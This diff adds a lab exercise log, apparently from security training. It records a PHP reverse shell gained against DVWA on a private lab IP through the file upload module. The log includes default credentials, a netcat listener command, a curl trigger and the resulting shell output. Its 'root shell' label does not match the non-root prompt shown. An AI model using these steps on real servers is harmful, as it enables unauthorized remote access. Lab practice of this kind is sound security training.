@@ -1,0 +1,18 @@
+=== Activity 3: Web Application Reverse Shell ===
+
+Target: http://192.168.56.101/dvwa
+Vulnerability: DVWA File Upload (Security: Low)
+Attack: PHP Reverse Shell
+
+Steps:
+1. Logged into DVWA (admin/password)
+2. Set security level to Low
+3. Uploaded shell.php via File Upload module
+4. Started netcat listener: nc -lvnp 4444
+5. Triggered shell: curl http://192.168.56.101/dvwa/hackable/uploads/shell.php
+
+Result:
+  Listening on 0.0.0.0 4444
+  Connection received on 192.168.56.101 39631
+  sh: no job control in this shell
+  sh-3.2$   <-- ROOT SHELL OBTAINED
